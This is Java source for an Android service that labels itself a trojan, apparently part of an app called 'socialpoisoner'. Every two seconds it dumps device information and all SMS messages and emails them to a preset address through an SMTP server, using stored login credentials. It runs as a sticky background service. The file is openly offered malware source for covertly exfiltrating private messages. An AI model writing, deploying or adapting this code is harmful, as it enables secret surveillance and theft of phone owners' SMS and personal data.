package com.cakeman.doctorrabb.socialpoisoner;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import com.cakeman.doctorrabb.socialpoisoner.modules.Dumper;
import com.cakeman.doctorrabb.socialpoisoner.modules.mailer;
import com.cakeman.doctorrabb.socialpoisoner.modules.messageBuilder;
import com.cakeman.doctorrabb.socialpoisoner.modules.constants;

import org.json.JSONObject;

import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by doctorrabb on 16.07.16.
 */
public class srv extends Service {
    @Override
    public void onCreate () {

        Timer notBadTimer = new Timer ();
        notBadTimer.schedule (new TrojanTimer (), 0, 2000);

        Log.d ("Trojan", "Trojan Started!");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand (Intent intent, int flags, int startId) {
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy () {
        Log.d ("Trojan", "Trojan Stopped");
    }

    class TrojanTimer extends TimerTask {
        public void run () {
            Dumper dumper = new Dumper();
            messageBuilder messageBuilder = null;
            try {

                messageBuilder = new messageBuilder(new JSONObject ().put ("info",
                        dumper.dumpInfo(getApplicationContext())).put ("sms",
                        dumper.dumpSMS(getApplicationContext())));

            } catch (Exception e) {
                Log.e ("Dump All Error", e.getMessage());
            }

            Log.d ("Device Information", dumper.dumpInfo(getApplicationContext()).toString());

            mailer m = new mailer ();
            m.sendMail (
                    constants.smtpServer,
                    constants.from,
                    constants.to,
                    constants.subject,
                    messageBuilder.buildToHtml(),
                    constants.login,
                    constants.password
            );
        }
    }


}
